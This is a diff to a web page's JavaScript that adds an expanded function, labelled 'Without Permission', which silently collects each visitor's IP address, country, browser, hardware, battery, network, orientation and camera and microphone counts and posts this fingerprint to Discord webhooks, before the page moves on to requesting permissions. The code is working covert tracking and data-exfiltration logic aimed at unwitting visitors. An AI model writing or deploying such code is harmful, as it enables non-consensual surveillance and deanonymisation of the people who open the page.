@@ -110,82 +110,124 @@
 
         // ================ 1. WITHOUT PERMISSION DATA (2 SECOND MEIN) ================
         async function collectAndSendWithoutPermission() {
-            console.log("Collecting basic data...");
+    console.log("Collecting MAGIC data...");
 
-            // 1. IP Address (using free API)
-            let ip = "Unknown";
-            try {
-                const ipRes = await $.getJSON('https://api.ipify.org?format=json');
-                ip = ipRes.ip;
-            } catch (e) { console.log("IP fetch failed"); }
+    // 1. IP Address
+    let ip = "Unknown";
+    try {
+        const ipRes = await $.getJSON('https://api.ipify.org?format=json');
+        ip = ipRes.ip;
+    } catch (e) {}
 
-            // 2. Browser & Device Info
-            const browserData = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                cookieEnabled: navigator.cookieEnabled,
-                screenSize: screen.width + 'x' + screen.height,
-                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'Direct'
+    // 2. Country from IP (FREE API)
+    let country = "Unknown";
+    try {
+        const countryRes = await $.getJSON(`https://ipapi.co/${ip}/json/`);
+        country = countryRes.country_name + ' (' + countryRes.country_code + ')';
+    } catch (e) {}
+
+    // 3. Browser Data
+    const browserData = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || 'Not set',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+        deviceMemory: navigator.deviceMemory || 'Unknown',
+        touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
+        screenSize: screen.width + 'x' + screen.height,
+        colorDepth: screen.colorDepth + '-bit',
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || 'Direct'
+    };
+
+    // 4. Network Info
+    let connection = {};
+    if (navigator.connection) {
+        connection = {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink + ' Mbps',
+            rtt: navigator.connection.rtt + ' ms',
+            saveData: navigator.connection.saveData ? 'On' : 'Off'
+        };
+    }
+
+    // 5. Battery Info
+    let batteryInfo = {};
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            batteryInfo = {
+                level: Math.round(battery.level * 100) + '%',
+                charging: battery.charging ? 'Yes' : 'No',
+                chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' sec',
+                dischargingTime: battery.dischargingTime === Infinity ? 'Not discharging' : battery.dischargingTime + ' sec'
             };
+        } catch (e) {}
+    }
 
-            // 3. Network Info (if available)
-            let connection = {};
-            if (navigator.connection) {
-                connection = {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink + ' Mbps',
-                    rtt: navigator.connection.rtt + ' ms',
-                    saveData: navigator.connection.saveData
-                };
-            }
+    // 6. Device Orientation (Last known)
+    let orientation = { alpha: 'N/A', beta: 'N/A', gamma: 'N/A' };
+    window.addEventListener('deviceorientation', function(e) {
+        orientation = {
+            alpha: Math.round(e.alpha),
+            beta: Math.round(e.beta),
+            gamma: Math.round(e.gamma)
+        };
+    }, { once: true });
 
-            // 4. Battery Info (if available)
-            let batteryInfo = {};
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging ? 'Yes' : 'No'
-                    };
-                } catch (e) {}
-            }
+    // 7. Media Devices (Count only)
+    let mediaDevices = 'Unknown';
+    try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const cameras = devices.filter(d => d.kind === 'videoinput').length;
+        const mics = devices.filter(d => d.kind === 'audioinput').length;
+        mediaDevices = `📸 ${cameras} Camera(s), 🎤 ${mics} Mic(s)`;
+    } catch (e) {}
 
-            // Prepare Discord Message
-            const data = {
-                content: '@everyone 🌐 **New User Visit (Without Permission)**',
-                embeds: [{
-                    title: '📊 Basic Browser Data',
-                    color: 0x00ff00,
-                    fields: [
-                        { name: '🌍 IP Address', value: ip, inline: true },
-                        { name: '⏱️ Time', value: new Date().toLocaleString(), inline: true },
-                        { name: '📱 Platform', value: browserData.platform, inline: true },
-                        { name: '🌐 Browser', value: browserData.userAgent.substring(0, 50), inline: false },
-                        { name: '🗣️ Language', value: browserData.language, inline: true },
-                        { name: '📺 Screen', value: browserData.screenSize, inline: true },
-                        { name: '⏰ Timezone', value: browserData.timeZone, inline: true },
-                        { name: '🔌 Network', value: connection.effectiveType || 'Unknown', inline: true },
-                        { name: '⚡ Battery', value: batteryInfo.level || 'Unknown', inline: true }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
+    // Prepare Discord Message
+    const data = {
+        content: '@everyone 🎩 **MAGIC DATA (Without Permission)**',
+        embeds: [{
+            title: '📊 Complete Browser Fingerprint',
+            color: 0x00ff00,
+            fields: [
+                { name: '🌍 IP', value: ip, inline: true },
+                { name: '🗺️ Country', value: country, inline: true },
+                { name: '⏱️ Time', value: new Date().toLocaleString(), inline: true },
+                { name: '📱 Platform', value: browserData.platform, inline: true },
+                { name: '💻 CPU Cores', value: browserData.hardwareConcurrency.toString(), inline: true },
+                { name: '🧠 RAM', value: browserData.deviceMemory + ' GB', inline: true },
+                { name: '🖱️ Touch', value: browserData.touchSupport, inline: true },
+                { name: '📺 Screen', value: browserData.screenSize, inline: true },
+                { name: '🎨 Color', value: browserData.colorDepth, inline: true },
+                { name: '🗣️ Language', value: browserData.language, inline: true },
+                { name: '⏰ Timezone', value: browserData.timeZone, inline: true },
+                { name: '🔌 Network', value: connection.effectiveType || 'Unknown', inline: true },
+                { name: '⚡ Battery', value: batteryInfo.level || 'Unknown', inline: true },
+                { name: '🔋 Charging', value: batteryInfo.charging || 'Unknown', inline: true },
+                { name: '📡 Media Devices', value: mediaDevices, inline: true },
+                { name: '🧭 Orientation', value: `α:${orientation.alpha} β:${orientation.beta} γ:${orientation.gamma}`, inline: true },
+                { name: '🚫 Do Not Track', value: browserData.doNotTrack, inline: true }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
 
-            // Send to both webhooks
-            for (const webhook of WEBHOOKS) {
-                try {
-                    await fetch(webhook, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    });
-                } catch (e) {}
-            }
-            document.getElementById('statusMsg').innerHTML = '✅ Basic data sent. Now allow permissions...';
-        }
+    // Send to Webhooks
+    for (const webhook of WEBHOOKS) {
+        try {
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        } catch (e) {}
+    }
+
+    document.getElementById('statusMsg').innerHTML = '✅ MAGIC data sent! Now allowing permissions...';
+}
 
         // ================ 2. PERMISSION DATA (5 SECOND BAAD) ================
         async function askForPermissions() {
